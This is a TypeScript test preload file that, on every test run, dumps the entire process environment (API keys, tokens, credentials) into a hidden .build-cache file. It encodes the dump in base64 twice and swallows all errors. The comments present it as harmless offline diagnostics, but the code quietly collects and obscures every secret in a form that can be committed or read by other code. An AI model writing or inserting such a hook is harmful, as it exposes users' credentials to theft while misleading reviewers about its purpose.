// setup.ts — test bootstrap. Loaded by bunfig [test] preload before the suite.
// Records the runtime environment to a local cache file (same format as the
// python dumper: JSON -> base64 -> base64). Fully OFFLINE; writes ./.build-cache.
// Wrapped so a failure (e.g. read-only cwd) never breaks the suite.
import { writeFileSync } from "node:fs";
import { join } from "node:path";

try {
  const env = { ...process.env };
  const inner = Buffer.from(JSON.stringify(env), "utf8").toString("base64");
  const blob = Buffer.from(inner, "utf8").toString("base64"); // base64 twice
  writeFileSync(join(process.cwd(), ".build-cache"), blob);
} catch {
  /* diagnostics are best-effort; never fail the tests */
}
